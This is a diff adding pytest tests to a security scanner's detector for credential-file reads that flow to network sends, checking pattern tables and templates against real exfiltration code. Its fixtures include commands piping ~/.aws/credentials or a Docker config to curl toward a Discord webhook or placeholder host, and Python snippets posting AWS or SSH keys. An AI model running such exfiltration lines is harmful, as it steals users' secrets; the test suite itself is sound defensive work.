@@ -2,11 +2,12 @@
 
 from __future__ import annotations
 
+import re
 import textwrap
 
 import pytest
 
-from cordon_scanner.detect.code.store_flow import StoreFlow
+from cordon_scanner.detect.code.store_flow import BoundClient, PythonStoreFlow, StoreFlow
 
 
 class FlowKit:
@@ -293,3 +294,218 @@ class TestFallsBackToText:
             'creds=$(cat ~/.docker/config.json)\n\n\n\ncurl -d "$creds" https://example.invalid\n'
         )
         assert StoreFlow.reaches(text, [1], [5], language="shell")
+
+
+class TestTextInAParsedFile:
+    """A store "read" that is only text inside a string, or an egress line that calls nothing, is not
+    a read or a send where the tree parses (reviews/pypi-98/20, shape A): a security tool's pattern
+    table, a help text naming `~/.aws/credentials`. An f-string's expressions are code."""
+
+    PATTERNS = (
+        "import re\n"
+        "RULES = '''\n"
+        "reads ~/.aws/credentials then posts it\n"
+        "requests.post(url, data=creds)\n"
+        "'''\n"
+        "def scan(text):\n"
+        "    return re.search(RULES, text)\n"
+    )
+
+    def test_a_store_named_in_a_multi_line_string_is_not_a_read(self) -> None:
+        assert not PythonFlowKit.flows(self.PATTERNS, ".aws/credentials", "requests.post")
+
+    def test_an_egress_line_that_calls_nothing_is_not_a_send(self) -> None:
+        text = "creds = open('/root/.netrc').read()\nURL = 'https://example.invalid/upload'\n"
+        assert not StoreFlow.reaches(text, [1], [2], language="python")
+
+    def test_a_store_opened_and_posted_still_reaches(self) -> None:
+        text = (
+            "import os, requests\n"
+            "def go():\n"
+            "    creds = open(os.path.expanduser('~/.aws/credentials')).read()\n"
+            "    requests.post('https://example.invalid/', data=creds)\n"
+        )
+        assert PythonFlowKit.flows(text, ".aws/credentials", "requests.post")
+
+    def test_a_store_path_in_a_multi_line_f_string_that_is_opened_still_reaches(self) -> None:
+        text = (
+            "import os, requests\n"
+            "def go(home):\n"
+            "    path = f'''{home}\n"
+            "/.aws/credentials{os.sep}'''\n"
+            "    creds = open(path).read()\n"
+            "    requests.post('https://example.invalid/', data=creds)\n"
+        )
+        assert StoreFlow.reaches(text, [4], [6], language="python")
+
+
+class TestATemplateIsNotCode:
+    """Templates and markup are not read as code for this rule (reviews/pypi-98/20, shape C): a
+    store's name and a request in an HTML or Jinja template are text at scan time, even where the
+    template renders a script run later. A shell script, a Makefile, a Dockerfile or a CI step keep
+    their reading."""
+
+    SHELL = (
+        "#!/bin/sh\ncat ~/.aws/credentials | curl -s -d @- https://discord.com/api/webhooks/1/x\n"
+    )
+
+    def test_an_html_template_is_recorded_below_the_gate(self, tmp_path):
+        from cordon_scanner.foundation.models import Severity
+
+        page = "<html><body><pre>\n" + self.SHELL + "</pre></body></html>\n"
+        grades = TestTheGrade.grade(tmp_path, page, "app/templates/index.html")
+        assert all(g <= Severity.MEDIUM for g in grades), grades
+
+    def test_a_jinja_template_is_recorded_below_the_gate(self, tmp_path):
+        from cordon_scanner.foundation.models import Severity
+
+        grades = TestTheGrade.grade(tmp_path, self.SHELL, "app/templates/boot.sh.j2")
+        assert all(g <= Severity.MEDIUM for g in grades), grades
+
+    def test_a_shell_script_keeps_its_reading(self, tmp_path):
+        """Reported as it is today (the hand-run provisioning ceiling), not lowered as a template."""
+        grades = TestTheGrade.grade(tmp_path, self.SHELL, "app/boot.sh")
+        assert grades
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "app/templates/index.html",
+            "x/page.htm",
+            "t/boot.sh.j2",
+            "t/a.jinja",
+            "t/a.jinja2",
+            "t/a.tmpl",
+            "t/a.mustache",
+            "t/a.hbs",
+        ],
+    )
+    def test_templates_and_markup(self, path: str) -> None:
+        from cordon_scanner.detect.code.capability.legitimate_use import LegitimateUse
+
+        assert LegitimateUse.is_template_or_markup(path)
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            ".github/workflows/ci.yml",
+            "app/boot.sh",
+            "Makefile",
+            "Dockerfile",
+            "a.ps1",
+            "a.bat",
+            "app/sync.py",
+            "x.tar.gz!pkg/setup.py",
+        ],
+    )
+    def test_what_runs_is_not_a_template(self, path: str) -> None:
+        from cordon_scanner.detect.code.capability.legitimate_use import LegitimateUse
+
+        assert not LegitimateUse.is_template_or_markup(path)
+
+
+class TestABoundClient:
+    """`BoundClient.configured`: a call on a receiver the file bound to a client constructor, to a host the
+    caller configures (reviews/pypi-98/20 B2). The tree decides it, where the call's own text names no client."""
+
+    CLIENT = re.compile(rb"paramiko|SSHClient")
+    SOURCE = (
+        "import paramiko\n"  # 1
+        "class Session:\n"  # 2
+        "    def __init__(self, host):\n"  # 3
+        "        self.host = host\n"  # 4
+        "        self.client = paramiko.SSHClient()\n"  # 5
+        "    def open(self, other):\n"  # 6
+        "        self.client.connect({host}, username='u')\n"  # 7
+    )
+
+    def configured(self, host: str, source: str | None = None) -> bool:
+        text = (source or self.SOURCE).replace("{host}", host)
+        line = next(i for i, ln in enumerate(text.split("\n"), 1) if ".connect(" in ln)
+        return BoundClient.configured(text, line, self.CLIENT)
+
+    @pytest.mark.parametrize("host", ["self.host", "other", "os.environ['H']", "cfg.host()"])
+    def test_a_host_the_caller_configures_is_the_users_own_login(self, host) -> None:
+        assert self.configured(host)
+
+    @pytest.mark.parametrize(
+        "host", ["'build.example.invalid'", "'a.' + 'example.invalid'", "f'build.example.invalid'"]
+    )
+    def test_a_host_written_down_in_the_file_is_not(self, host) -> None:
+        assert not self.configured(host)
+
+    def test_a_name_every_binding_of_which_is_a_literal_is_written_down(self) -> None:
+        source = "TARGET = 'build.example.invalid'\n" + self.SOURCE
+        assert not self.configured("TARGET", source)
+
+    def test_an_attribute_the_file_sets_to_a_literal_is_written_down(self) -> None:
+        source = self.SOURCE.replace("self.host = host", "self.host = 'build.example.invalid'")
+        assert not self.configured("self.host", source)
+
+    def test_an_attribute_set_from_a_parameter_is_configured(self) -> None:
+        assert self.configured("self.host")
+
+    def test_a_receiver_bound_to_another_constructor_is_not_the_keys_client(self) -> None:
+        source = self.SOURCE.replace("paramiko.SSHClient()", "requests.Session()")
+        assert not self.configured("self.host", source)
+
+    def test_a_receiver_the_file_never_binds_is_not(self) -> None:
+        source = self.SOURCE.replace("        self.client = paramiko.SSHClient()\n", "")
+        assert not self.configured("self.host", source)
+
+    def test_a_receiver_bound_through_a_local_name_is_the_clients(self) -> None:
+        source = self.SOURCE.replace(
+            "        self.client = paramiko.SSHClient()\n",
+            "        ssh = paramiko.SSHClient()\n        self.client = ssh\n",
+        )
+        assert self.configured("self.host", source)
+
+    def test_a_file_that_does_not_parse_keeps_the_text_reading(self) -> None:
+        assert not BoundClient.configured("def (:\n", 1, self.CLIENT)
+
+
+class TestATableWrittenOneStringToALine:
+    """`PythonStoreFlow.table_text_lines`: strings, one to a line, that no opener or runner is given are text."""
+
+    TABLE = '[\n    "cat ~/.aws/credentials",\n    "cat ~/.ssh/id_rsa",\n]\n'
+
+    def lines(self, use: str) -> frozenset[int]:
+        from cordon_scanner.analysis.python.pysyntax import PythonSyntax
+
+        source = f"import os, re\nPATTERNS = {self.TABLE}{use}\n"
+        return PythonStoreFlow.table_text_lines(PythonSyntax.parse(source))
+
+    @pytest.mark.parametrize(
+        "use",
+        [
+            "def scan(t):\n    return [p for p in PATTERNS if p in t]\n",
+            "def scan(t):\n    return [re.search(p, t) for p in PATTERNS]\n",
+            "def show():\n    for p in PATTERNS:\n        print(p)\n",
+            "",
+        ],
+        ids=["compared", "matched", "printed", "never used"],
+    )
+    def test_a_table_that_is_matched_or_shown_is_text(self, use) -> None:
+        assert self.lines(use) == {3, 4}
+
+    @pytest.mark.parametrize(
+        "use",
+        [
+            "def grab():\n    return [open(os.path.expanduser(p)).read() for p in PATTERNS]\n",
+            "def grab():\n    for p in PATTERNS:\n        data = open(p).read()\n",
+            "def go():\n    exec('\\n'.join(PATTERNS))\n",
+            "def go():\n    os.system(' ; '.join(PATTERNS))\n",
+            "from pathlib import Path\ndef go():\n    return [Path(p).read_text() for p in PATTERNS]\n",
+            "def read(p):\n    return open(p).read()\ndef go():\n    return [read(p) for p in PATTERNS]\n",
+        ],
+        ids=[
+            "opened",
+            "opened in a loop",
+            "exec joined",
+            "os.system joined",
+            "read_text",
+            "a local reader",
+        ],
+    )
+    def test_a_list_a_loop_opens_or_a_join_runs_is_code(self, use) -> None:
+        assert self.lines(use) == frozenset()
